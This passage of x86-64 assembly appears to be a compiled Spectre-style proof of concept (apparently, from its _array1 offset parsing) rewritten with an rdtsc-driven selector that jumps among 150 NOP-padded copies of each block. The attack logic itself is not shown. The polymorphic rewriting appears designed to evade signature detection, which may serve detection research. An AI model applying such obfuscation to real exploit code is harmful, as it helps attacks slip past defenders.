	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 130
.Lmain_win4_var130:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 131
.Lmain_win4_var131:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 132
.Lmain_win4_var132:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 133
.Lmain_win4_var133:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 134
.Lmain_win4_var134:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 135
.Lmain_win4_var135:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 136
.Lmain_win4_var136:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 137
.Lmain_win4_var137:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 138
.Lmain_win4_var138:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 139
.Lmain_win4_var139:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 140
.Lmain_win4_var140:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 141
.Lmain_win4_var141:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 142
.Lmain_win4_var142:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 143
.Lmain_win4_var143:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 144
.Lmain_win4_var144:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 145
.Lmain_win4_var145:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 146
.Lmain_win4_var146:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 147
.Lmain_win4_var147:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 148
.Lmain_win4_var148:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 149
.Lmain_win4_var149:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
.Lmain_win4_continue:
	movb	$0, %al
	callq	_sscanf
	movq	-48(%rbp), %rax
	leaq	_array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, -48(%rbp)
	movq	-32(%rbp), %rax
	movq	24(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-52(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
LBB2_8:
	movl	-36(%rbp), %esi
	leaq	L_.str.3(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.4(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.5(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.6(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.7(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.8(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.9(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.10(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-52(%rbp), %esi
	leaq	L_.str.11(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB2_9:                                 ## =>This Inner Loop Header: Depth=1
	movl	-52(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -52(%rbp)
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win3_var0
	cmpl	$1, %eax
	je	.Lmain_win3_var1
	cmpl	$2, %eax
	je	.Lmain_win3_var2
	cmpl	$3, %eax
	je	.Lmain_win3_var3
	cmpl	$4, %eax
	je	.Lmain_win3_var4
	cmpl	$5, %eax
	je	.Lmain_win3_var5
	cmpl	$6, %eax
	je	.Lmain_win3_var6
	cmpl	$7, %eax
	je	.Lmain_win3_var7
	cmpl	$8, %eax
	je	.Lmain_win3_var8
	cmpl	$9, %eax
	je	.Lmain_win3_var9
	cmpl	$10, %eax
	je	.Lmain_win3_var10
	cmpl	$11, %eax
	je	.Lmain_win3_var11
	cmpl	$12, %eax
	je	.Lmain_win3_var12
	cmpl	$13, %eax
	je	.Lmain_win3_var13
	cmpl	$14, %eax
	je	.Lmain_win3_var14
	cmpl	$15, %eax
	je	.Lmain_win3_var15
	cmpl	$16, %eax
	je	.Lmain_win3_var16
	cmpl	$17, %eax
	je	.Lmain_win3_var17
	cmpl	$18, %eax
	je	.Lmain_win3_var18
	cmpl	$19, %eax
	je	.Lmain_win3_var19
	cmpl	$20, %eax
	je	.Lmain_win3_var20
	cmpl	$21, %eax
	je	.Lmain_win3_var21
	cmpl	$22, %eax
	je	.Lmain_win3_var22
	cmpl	$23, %eax
	je	.Lmain_win3_var23
	cmpl	$24, %eax
	je	.Lmain_win3_var24
	cmpl	$25, %eax
	je	.Lmain_win3_var25
	cmpl	$26, %eax
	je	.Lmain_win3_var26
	cmpl	$27, %eax
	je	.Lmain_win3_var27
	cmpl	$28, %eax
	je	.Lmain_win3_var28
	cmpl	$29, %eax
	je	.Lmain_win3_var29
	cmpl	$30, %eax
	je	.Lmain_win3_var30
	cmpl	$31, %eax
	je	.Lmain_win3_var31
	cmpl	$32, %eax
	je	.Lmain_win3_var32
	cmpl	$33, %eax
	je	.Lmain_win3_var33
	cmpl	$34, %eax
	je	.Lmain_win3_var34
	cmpl	$35, %eax
	je	.Lmain_win3_var35
	cmpl	$36, %eax
	je	.Lmain_win3_var36
	cmpl	$37, %eax
	je	.Lmain_win3_var37
	cmpl	$38, %eax
	je	.Lmain_win3_var38
	cmpl	$39, %eax
	je	.Lmain_win3_var39
	cmpl	$40, %eax
	je	.Lmain_win3_var40
	cmpl	$41, %eax
	je	.Lmain_win3_var41
	cmpl	$42, %eax
	je	.Lmain_win3_var42
	cmpl	$43, %eax
	je	.Lmain_win3_var43
	cmpl	$44, %eax
	je	.Lmain_win3_var44
	cmpl	$45, %eax
	je	.Lmain_win3_var45
	cmpl	$46, %eax
	je	.Lmain_win3_var46
	cmpl	$47, %eax
	je	.Lmain_win3_var47
	cmpl	$48, %eax
	je	.Lmain_win3_var48
	cmpl	$49, %eax
	je	.Lmain_win3_var49
	cmpl	$50, %eax
	je	.Lmain_win3_var50
	cmpl	$51, %eax
	je	.Lmain_win3_var51
	cmpl	$52, %eax
	je	.Lmain_win3_var52
	cmpl	$53, %eax
	je	.Lmain_win3_var53
	cmpl	$54, %eax
	je	.Lmain_win3_var54
	cmpl	$55, %eax
	je	.Lmain_win3_var55
	cmpl	$56, %eax
	je	.Lmain_win3_var56
	cmpl	$57, %eax
	je	.Lmain_win3_var57
	cmpl	$58, %eax
	je	.Lmain_win3_var58
	cmpl	$59, %eax
	je	.Lmain_win3_var59
	cmpl	$60, %eax
	je	.Lmain_win3_var60
	cmpl	$61, %eax
	je	.Lmain_win3_var61
	cmpl	$62, %eax
	je	.Lmain_win3_var62
	cmpl	$63, %eax
	je	.Lmain_win3_var63
	cmpl	$64, %eax
	je	.Lmain_win3_var64
	cmpl	$65, %eax
	je	.Lmain_win3_var65
	cmpl	$66, %eax
	je	.Lmain_win3_var66
	cmpl	$67, %eax
	je	.Lmain_win3_var67
	cmpl	$68, %eax
	je	.Lmain_win3_var68
	cmpl	$69, %eax
	je	.Lmain_win3_var69
	cmpl	$70, %eax
	je	.Lmain_win3_var70
	cmpl	$71, %eax
	je	.Lmain_win3_var71
	cmpl	$72, %eax
	je	.Lmain_win3_var72
	cmpl	$73, %eax
	je	.Lmain_win3_var73
	cmpl	$74, %eax
	je	.Lmain_win3_var74
	cmpl	$75, %eax
	je	.Lmain_win3_var75
	cmpl	$76, %eax
	je	.Lmain_win3_var76
	cmpl	$77, %eax
	je	.Lmain_win3_var77
	cmpl	$78, %eax
	je	.Lmain_win3_var78
	cmpl	$79, %eax
	je	.Lmain_win3_var79
	cmpl	$80, %eax
	je	.Lmain_win3_var80
	cmpl	$81, %eax
	je	.Lmain_win3_var81
	cmpl	$82, %eax
	je	.Lmain_win3_var82
	cmpl	$83, %eax
	je	.Lmain_win3_var83
	cmpl	$84, %eax
	je	.Lmain_win3_var84
	cmpl	$85, %eax
	je	.Lmain_win3_var85
	cmpl	$86, %eax
	je	.Lmain_win3_var86
	cmpl	$87, %eax
	je	.Lmain_win3_var87
	cmpl	$88, %eax
	je	.Lmain_win3_var88
	cmpl	$89, %eax
	je	.Lmain_win3_var89
	cmpl	$90, %eax
	je	.Lmain_win3_var90
	cmpl	$91, %eax
	je	.Lmain_win3_var91
	cmpl	$92, %eax
	je	.Lmain_win3_var92
	cmpl	$93, %eax
	je	.Lmain_win3_var93
	cmpl	$94, %eax
	je	.Lmain_win3_var94
	cmpl	$95, %eax
	je	.Lmain_win3_var95
	cmpl	$96, %eax
	je	.Lmain_win3_var96
	cmpl	$97, %eax
	je	.Lmain_win3_var97
	cmpl	$98, %eax
	je	.Lmain_win3_var98
	cmpl	$99, %eax
	je	.Lmain_win3_var99
	cmpl	$100, %eax
	je	.Lmain_win3_var100
	cmpl	$101, %eax
	je	.Lmain_win3_var101
	cmpl	$102, %eax
	je	.Lmain_win3_var102
	cmpl	$103, %eax
	je	.Lmain_win3_var103
	cmpl	$104, %eax
	je	.Lmain_win3_var104
	cmpl	$105, %eax
	je	.Lmain_win3_var105
	cmpl	$106, %eax
	je	.Lmain_win3_var106
	cmpl	$107, %eax
	je	.Lmain_win3_var107
	cmpl	$108, %eax
	je	.Lmain_win3_var108
	cmpl	$109, %eax
	je	.Lmain_win3_var109
	cmpl	$110, %eax
	je	.Lmain_win3_var110
	cmpl	$111, %eax
	je	.Lmain_win3_var111
	cmpl	$112, %eax
	je	.Lmain_win3_var112
	cmpl	$113, %eax
	je	.Lmain_win3_var113
	cmpl	$114, %eax
	je	.Lmain_win3_var114
	cmpl	$115, %eax
	je	.Lmain_win3_var115
	cmpl	$116, %eax
	je	.Lmain_win3_var116
	cmpl	$117, %eax
	je	.Lmain_win3_var117
	cmpl	$118, %eax
	je	.Lmain_win3_var118
	cmpl	$119, %eax
	je	.Lmain_win3_var119
	cmpl	$120, %eax
	je	.Lmain_win3_var120
	cmpl	$121, %eax
	je	.Lmain_win3_var121
	cmpl	$122, %eax
	je	.Lmain_win3_var122
	cmpl	$123, %eax
	je	.Lmain_win3_var123
	cmpl	$124, %eax
	je	.Lmain_win3_var124
	cmpl	$125, %eax
	je	.Lmain_win3_var125
	cmpl	$126, %eax
	je	.Lmain_win3_var126
	cmpl	$127, %eax
	je	.Lmain_win3_var127
	cmpl	$128, %eax
	je	.Lmain_win3_var128
	cmpl	$129, %eax
	je	.Lmain_win3_var129
	cmpl	$130, %eax
	je	.Lmain_win3_var130
	cmpl	$131, %eax
	je	.Lmain_win3_var131
	cmpl	$132, %eax
	je	.Lmain_win3_var132
	cmpl	$133, %eax
	je	.Lmain_win3_var133
	cmpl	$134, %eax
	je	.Lmain_win3_var134
	cmpl	$135, %eax
	je	.Lmain_win3_var135
	cmpl	$136, %eax
	je	.Lmain_win3_var136
	cmpl	$137, %eax
	je	.Lmain_win3_var137
	cmpl	$138, %eax
	je	.Lmain_win3_var138
	cmpl	$139, %eax
	je	.Lmain_win3_var139
	cmpl	$140, %eax
	je	.Lmain_win3_var140
	cmpl	$141, %eax
	je	.Lmain_win3_var141
	cmpl	$142, %eax
	je	.Lmain_win3_var142
	cmpl	$143, %eax
	je	.Lmain_win3_var143
	cmpl	$144, %eax
	je	.Lmain_win3_var144
	cmpl	$145, %eax
	je	.Lmain_win3_var145
	cmpl	$146, %eax
	je	.Lmain_win3_var146
	cmpl	$147, %eax
	je	.Lmain_win3_var147
	cmpl	$148, %eax
	je	.Lmain_win3_var148
	cmpl	$149, %eax
	je	.Lmain_win3_var149
	jmp	.Lmain_win3_var0
## Variant 0
.Lmain_win3_var0:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 1
.Lmain_win3_var1:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 2
.Lmain_win3_var2:
	popq	%rax
	nop
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 3
.Lmain_win3_var3:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	nop
	nop
	jmp	.Lmain_win3_continue
## Variant 4
.Lmain_win3_var4:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 5
.Lmain_win3_var5:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 6
.Lmain_win3_var6:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 7
.Lmain_win3_var7:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 8
.Lmain_win3_var8:
	popq	%rax
	nop
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 9
.Lmain_win3_var9:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 10
.Lmain_win3_var10:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 11
.Lmain_win3_var11:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 12
.Lmain_win3_var12:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 13
.Lmain_win3_var13:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 14
.Lmain_win3_var14:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	nop
	jmp	.Lmain_win3_continue
## Variant 15
.Lmain_win3_var15:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 16
.Lmain_win3_var16:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 17
.Lmain_win3_var17:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 18
.Lmain_win3_var18:
	popq	%rax
	cmpl	$0, %eax
	nop
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 19
.Lmain_win3_var19:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 20
.Lmain_win3_var20:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 21
.Lmain_win3_var21:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 22
.Lmain_win3_var22:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 23
.Lmain_win3_var23:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 24
.Lmain_win3_var24:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 25
.Lmain_win3_var25:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 26
.Lmain_win3_var26:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 27
.Lmain_win3_var27:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 28
.Lmain_win3_var28:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 29
.Lmain_win3_var29:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 30
.Lmain_win3_var30:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 31
.Lmain_win3_var31:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 32
.Lmain_win3_var32:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 33
.Lmain_win3_var33:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 34
.Lmain_win3_var34:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 35
.Lmain_win3_var35:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 36
.Lmain_win3_var36:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 37
